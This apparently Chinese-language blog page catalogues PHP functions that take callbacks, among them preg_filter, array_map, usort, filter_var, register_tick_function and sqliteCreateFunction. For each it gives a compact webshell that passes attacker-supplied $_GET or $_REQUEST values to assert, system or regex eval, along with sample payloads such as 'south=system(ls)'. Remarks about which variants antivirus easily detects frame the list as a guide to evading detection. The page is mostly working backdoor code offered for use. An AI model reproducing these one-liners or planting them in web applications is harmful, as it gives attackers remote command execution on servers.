+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_filter</span>(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+<p>和<strong>preg_replace</strong>相似，不同之处是返回值。</p>
+<blockquote>
+<p>三参数调用<strong>preg_replace</strong>需要注意版本号</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">preg_filter</span>(<span class="string">&#x27;|.*|e&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
+<h2 id="preg_replace_callback">preg_replace_callback</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace_callback</span>(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">callable</span> <span class="variable">$callback</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+<p>和<strong>preg_replace</strong>相似，不同之处是可以用回调函数代替<strong>$replacement</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/.+/i&#x27;</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>), <span class="variable">$_REQUEST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
+<h2 id="mb_ereg_replace">mb_ereg_replace</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_ereg_replace</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$string</span>,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$options</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="literal">false</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+<p>和<strong>preg_replace</strong>相似，不同之处是不用分隔符<strong>/</strong>。</p>
+<blockquote>
+<p>三参数调用<strong>preg_replace</strong>需要注意版本号，<strong>PHP7</strong>被弃用。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">mb_ereg_replace</span>(<span class="string">&#x27;.*&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line"><span class="comment"># south=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h2 id="mb_ereg_replace_callback">mb_ereg_replace_callback</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_ereg_replace_callback</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">callable</span> <span class="variable">$callback</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$string</span>,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$options</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="literal">false</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+<p>和<strong>mb_ereg_replace</strong>相似，不同之处是可以用回调函数代替<strong>$replacement</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">mb_ereg_replace_callback</span>(<span class="string">&#x27;.+&#x27;</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>), <span class="variable">$_REQUEST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<h2 id="callbackfilteriterator">CallbackFilterIterator</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title class_">CallbackFilterIterator</span>::<span class="title function_ invoke__">__construct</span>(<span class="built_in">Iterator</span> <span class="variable">$iterator</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>PHP&gt;=5.4.0</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">CallbackFilterIterator</span>(<span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>],)), <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$sea&#x27;</span>, <span class="string">&#x27;assert($sea);&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$iterator</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$item</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="filter_var">filter_var</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$filter</span> = FILTER_DEFAULT, <span class="keyword">array</span>|<span class="keyword">int</span> <span class="variable">$options</span> = <span class="number">0</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>PHP</strong>全版本支持<strong>assert</strong>单参数调用</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">filter_var</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>));</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
+<h2 id="filter_var_array">filter_var_array</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var_array</span>(<span class="keyword">array</span> <span class="variable">$data</span>, <span class="keyword">mixed</span> <span class="variable">$definition</span> = ?, <span class="keyword">bool</span> <span class="variable">$add_empty</span> = <span class="literal">true</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>PHP</strong>全版本支持<strong>assert</strong>单参数调用</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">filter_var_array</span>(<span class="keyword">array</span>(<span class="string">&#x27;sea&#x27;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;sea&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
+<h2 id="array_map">array_map</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>(?<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">array</span> ...<span class="variable">$arrays</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
+<p>类似于<strong>call_user_func</strong>，但后面传入的<strong>$array1</strong>是多组参数，而返回的是多组参数的执行结果。</p>
+<blockquote>
+<p>容易被查杀</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system&amp;sea[0]=ls</span></span><br></pre></td></tr></table></figure>
+<h2 id="array_filter">array_filter</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span> <span class="variable">$array</span>, ?<span class="keyword">callable</span> <span class="variable">$callback</span> = <span class="literal">null</span>, <span class="keyword">int</span> <span class="variable">$mode</span> = <span class="number">0</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
+<p>同上相似，但是需要注意的是第一个参数是回调函数的参数，第二个参数才是回调函数的函数名，且返回的结果是当回调函数返回<strong>true</strong>时的第一个参数的值的数组。</p>
+<blockquote>
+<p>容易被查杀</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">array_filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system&amp;sea[0]=ls</span></span><br></pre></td></tr></table></figure>
+<h2 id="array_walk">array_walk</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="keyword">array</span>|<span class="keyword">object</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$arg</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>三参数调用<strong>preg_replace</strong>需要注意版本号</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sea</span> = <span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">    <span class="title function_ invoke__">array_walk</span>(<span class="variable">$sea</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment"># south=preg_replace&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h2 id="array_walk_recursive">array_walk_recursive</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk_recursive</span>(<span class="keyword">array</span>|<span class="keyword">object</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$arg</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<p>第二个参数为回调函数名。</p>
+<blockquote>
+<p>三参数调用<strong>preg_replace</strong>需要注意版本号</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sea</span> = <span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">    <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$sea</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment"># south=preg_replace&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h2 id="array_reduce">array_reduce</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_reduce</span>(<span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$initial</span> = <span class="literal">null</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+<p>用回调函数迭代地将数组简化为单一的值。</p>
+<blockquote>
+<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">array_reduce</span>(<span class="keyword">array</span>(<span class="number">1</span>), <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h2 id="array_udiff">array_udiff</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_udiff</span>(<span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">array</span> ...<span class="variable">$arrays</span>, <span class="keyword">callable</span> <span class="variable">$value_compare_func</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
+<p>用回调函数比较数据来计算数组的差集。</p>
+<blockquote>
+<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">array_udiff</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]), <span class="keyword">array</span>(<span class="number">1</span>), <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h2 id="register_shutdown_function">register_shutdown_function</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">register_shutdown_function</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
+<p>注册一个会在php中止时执行的函数。</p>
+<blockquote>
+<p><strong>PHP</strong>全版本支持<strong>assert</strong>单参数调用</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">register_shutdown_function</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h2 id="register_tick_function">register_tick_function</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">register_tick_function</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<p>注册一个函数以便在每个<strong>tick</strong>上执行。</p>
+<blockquote>
+<p><strong>PHP</strong>全版本支持<strong>assert</strong>单参数调用</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">register_tick_function</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h2 id="usort">usort</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">usort</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<p>该函数的原本作用是使用用户自定义的比较函数对数组中的值进行排序，在<strong>PHP5.6</strong>下开始支持变长参数，因此在<strong>Shell</strong>的构造中可以这样。且只有数字索引数组才能作为变长参数数组。</p>
+<blockquote>
+<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br><span class="line"><span class="comment"># 1[]=1&amp;1[]=ls&amp;2=system</span></span><br></pre></td></tr></table></figure>
+<h2 id="uasort">uasort</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用</p>
+</blockquote>
+<p>同上，不同之处是不会打乱原数组的顺序。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">uasort</span>(...<span class="variable">$_GET</span>);</span><br><span class="line"><span class="comment"># 1[]=1&amp;1[]=ls&amp;2=system</span></span><br></pre></td></tr></table></figure>
+<h2 id="uksort">uksort</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">uksort</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sea</span> = <span class="keyword">array</span>(<span class="string">&#x27;sea&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>] =&gt; <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">uksort</span>(<span class="variable">$sea</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h3 id="扩展">扩展</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// way 0</span></span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;sea&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]));</span><br><span class="line">    <span class="variable">$arr</span>-&gt;<span class="title function_ invoke__">uasort</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// way 1</span></span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;sea&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>] =&gt; <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$arr</span>-&gt;<span class="title function_ invoke__">uksort</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="comment"># south=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h2 id="sqlitecreatefunction">sqliteCreateFunction</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PDO::<span class="title function_ invoke__">sqliteCreateFunction</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$function_name</span>,</span><br><span class="line">    <span class="keyword">callable</span> <span class="variable">$callback</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$num_args</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span></span><br><span class="line">): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<p>利用数据库的回调函数。</p>
+<blockquote>
+<p><strong>PHP&gt;=5.3</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:sqlite.db3&#x27;</span>);</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">sqliteCreateFunction</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT exp(:exec)&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="keyword">array</span>(<span class="string">&#x27;:exec&#x27;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]));</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h3 id="扩展-1">扩展</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;sqlite.db3&#x27;</span>);</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">createFunction</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT exp(?)&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">1</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>], SQLITE3_TEXT);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
+<p><strong>PHP&lt;5.3</strong>时使用<strong>sqlite_*</strong>方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$db</span> = <span class="title function_ invoke__">sqlite_open</span>(<span class="string">&#x27;sqlite.db3&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">sqlite_create_function</span>(<span class="variable">$db</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">sqlite_array_query</span>(<span class="variable">$db</span>, <span class="string">&quot;SELECT exp(&#x27;<span class="subst">&#123;$_GET[&#x27;south&#x27;]&#125;</span>&#x27;)&quot;</span>);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
+<h2 id="yaml_parse">yaml_parse</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">yaml_parse</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$input</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$pos</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$ndocs</span> = ?,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$callbacks</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+<p>需要额外的组件。</p>
